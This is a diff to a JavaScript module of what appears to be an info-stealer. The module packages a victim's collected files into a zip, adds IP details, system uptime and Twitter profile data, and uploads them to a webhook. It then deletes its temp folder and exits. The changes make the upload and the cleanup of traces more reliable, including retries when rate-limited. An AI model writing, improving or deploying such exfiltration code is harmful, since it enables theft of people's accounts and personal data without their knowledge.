@@ -13,8 +13,6 @@ const { sleep } = require('../util/general');
 const { getNameAndVersion } = require('../util/os');
 const { getTempFolder } = require('../util/init');
 
-if (!webhook.url || typeof webhook.url !== 'string' || !isValidURL(webhook.url)) return;
-
 const json = async (zipFile) => {
   const ipInfo = async (info) => await require('./ip-info').then(ip => ip[info]);
   const uptime = Math.floor(Math.round(Date.now() / 1000) - os.uptime());
@@ -149,7 +147,7 @@ const json = async (zipFile) => {
         url: `https://twitter.com/${profile.screen_name}`
       },
       fields: [
-        ['📜 Bio', profile.description.replaceAll(/@(\w{1,15})/gi, '[@$1](https://twitter.com/$1)')],
+        ['📜 Bio', profile.description?.replaceAll(/@(\w{1,15})/gi, '[@$1](https://twitter.com/$1)')],
         ['Followers', profile.followers_count],
         ['Following', profile.friends_count],
         ['🐦 Tweets', profile.statuses_count],
@@ -281,14 +279,15 @@ const json = async (zipFile) => {
 };
 
 const send = async (zipFile) => {
+  if (!webhook.url || typeof webhook.url !== 'string' || !isValidURL(webhook.url)) return;
+
   const data = new FormData();
   data.append('files[0]', fs.createReadStream(zipFile));
   data.append('payload_json', JSON.stringify(await json(zipFile?.split(sep)?.pop())));
 
   const deleteFiles = async () => {
     try {
-      await sleep(1000);
-      rmSync(getTempFolder(), { recursive: true });
+      await rmSync(getTempFolder(), { recursive: true, force: true, maxRetries: 5, retryDelay: 100 });
     } catch (e) {
       await deleteFiles();
     }
@@ -300,15 +299,18 @@ const send = async (zipFile) => {
     await deleteFiles();
     process.exit(0);
   } catch (err) {
-    if (
-      err.response?.data.message.includes('You are being blocked from accessing our API temporarily due to exceeding our rate limits frequently.')
-    ) {
-      await deleteFiles();
-      process.exit(0);
-      return;
+    if (err.response?.data) {
+      if (
+        err.response.status === 429 &&
+        err.response.data.message?.includes('You are being blocked from accessing our API temporarily due to exceeding our rate limits frequently.')
+      ) {
+        await deleteFiles();
+        process.exit(0);
+      } else if (err.response.status === 429 && err.response.data?.retry_after) {
+        await sleep((err.response.data.retry_after * 1000) + 500);
+        await send(zipFile);
+      }
     }
-    await sleep((err.response?.data?.retry_after * 1000) + 500);
-    await send(zipFile);
   }
 };
 
